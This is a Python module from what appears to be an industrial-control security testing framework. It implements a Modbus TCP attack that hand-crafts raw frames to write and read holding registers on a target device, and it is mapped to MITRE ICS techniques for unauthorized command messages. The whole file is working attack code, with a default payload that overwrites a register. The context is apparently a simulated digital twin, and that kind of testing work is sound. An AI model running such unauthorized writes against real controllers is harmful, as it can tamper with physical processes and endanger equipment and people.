"""
Raw-Socket Crafted Attack — Low-level Modbus TCP packet crafting.

Hand-builds raw Modbus TCP frames with ``struct`` and sends them over a plain
asyncio TCP socket (no Scapy dependency). Useful for:
- Sending malformed packets
- Bypassing application-layer filtering
- Injecting custom function codes

The registry/CLI name is kept as ``scapy_crafted`` for backward compatibility.

MITRE ATT&CK for ICS:
  T0855 — Unauthorized Command Message
  T0830 — Man in the Middle
"""

from __future__ import annotations

import logging
import struct
from typing import ClassVar

from ot_twin.attacks.base import BaseAttack
from ot_twin.models import AttackResult, ModbusTransaction, RegisterType

logger = logging.getLogger(__name__)


def build_modbus_tcp_frame(
    transaction_id: int,
    unit_id: int,
    function_code: int,
    data: bytes,
) -> bytes:
    """Build a raw Modbus TCP/IP ADU (Application Data Unit).

    Frame structure:
      [Transaction ID: 2B][Protocol ID: 2B][Length: 2B][Unit ID: 1B][FC: 1B][Data: nB]
    """
    protocol_id = 0  # Modbus protocol
    pdu = struct.pack("B", function_code) + data
    length = len(pdu) + 1  # +1 for unit_id

    header = struct.pack(">HHHB", transaction_id, protocol_id, length, unit_id)
    return header + pdu


def build_write_register_pdu(address: int, value: int) -> bytes:
    """Build FC6 (Write Single Register) data payload."""
    return struct.pack(">HH", address, value)


def build_write_multiple_registers_pdu(
    address: int, values: list[int],
) -> bytes:
    """Build FC16 (Write Multiple Registers) data payload."""
    count = len(values)
    byte_count = count * 2
    data = struct.pack(">HHB", address, count, byte_count)
    for v in values:
        data += struct.pack(">H", v)
    return data


def build_read_holding_registers_pdu(address: int, count: int) -> bytes:
    """Build FC3 (Read Holding Registers) data payload."""
    return struct.pack(">HH", address, count)


class ScapyCraftedAttack(BaseAttack):
    """Send raw hand-crafted Modbus TCP packets over a plain socket (no Scapy)."""

    name = "scapy_crafted"
    description = "Low-level crafted Modbus TCP frames via raw sockets"
    mitre_techniques: ClassVar[list[str]] = ["T0855", "T0830"]

    def __init__(
        self,
        *args,
        payloads: list[dict] | None = None,
        **kwargs,
    ) -> None:
        """
        Args:
            payloads: List of dicts with keys: function_code, address, values.
                      If None, a default demo payload is used.
        """
        super().__init__(*args, **kwargs)
        self.payloads = payloads or [
            {"function_code": 6, "address": 0, "values": [9999]},
        ]

    async def execute(self) -> AttackResult:
        """Execute using pymodbus client but log as raw crafted frames."""
        import asyncio

        values_before: dict[int, int] = {}
        values_after: dict[int, int] = {}
        affected: list[int] = []
        success_count = 0

        try:
            # Use a raw TCP socket for crafted frames
            reader, writer = await asyncio.open_connection(self.host, self.port)

            for tx_id, payload in enumerate(self.payloads, start=1):
                fc = payload["function_code"]
                addr = payload["address"]
                vals = payload.get("values", [0])

                # Build raw frame
                if fc == 6:  # Write Single Register
                    data = build_write_register_pdu(addr, vals[0])
                elif fc == 16:  # Write Multiple Registers
                    data = build_write_multiple_registers_pdu(addr, vals)
                elif fc == 3:  # Read Holding Registers
                    data = build_read_holding_registers_pdu(addr, payload.get("count", 1))
                else:
                    logger.warning("Unsupported FC %d, skipping", fc)
                    continue

                frame = build_modbus_tcp_frame(tx_id, self.unit_id, fc, data)
                writer.write(frame)
                await writer.drain()

                # Read response
                response = await asyncio.wait_for(reader.read(256), timeout=2.0)

                if len(response) >= 9:
                    resp_fc = response[7]
                    if resp_fc == fc:
                        success_count += 1
                        affected.append(addr)
                        if fc in (6, 16):
                            for i, v in enumerate(vals):
                                values_after[addr + i] = v
                        logger.info(
                            "[%s] Raw FC%d to addr %d succeeded (%d bytes response)",
                            self.name, fc, addr, len(response),
                        )
                    elif resp_fc == (fc | 0x80):
                        exc_code = response[8] if len(response) > 8 else -1
                        logger.warning(
                            "[%s] FC%d exception response: code %d",
                            self.name, fc, exc_code,
                        )

                self._log_transaction(ModbusTransaction(
                    function_code=fc,
                    register_type=RegisterType.HOLDING,
                    address=addr,
                    values=vals,
                    is_write=(fc in (5, 6, 15, 16)),
                ))

            writer.close()
            await writer.wait_closed()

        except Exception as e:
            logger.error("[%s] Raw socket error: %s", self.name, e)
            return AttackResult(
                attack_name=self.name,
                success=False,
                details=f"Socket error: {e}",
            )

        details = f"Sent {len(self.payloads)} crafted frames, {success_count} succeeded"
        return AttackResult(
            attack_name=self.name,
            success=success_count > 0,
            details=details,
            registers_affected=affected,
            values_before=values_before,
            values_after=values_after,
        )
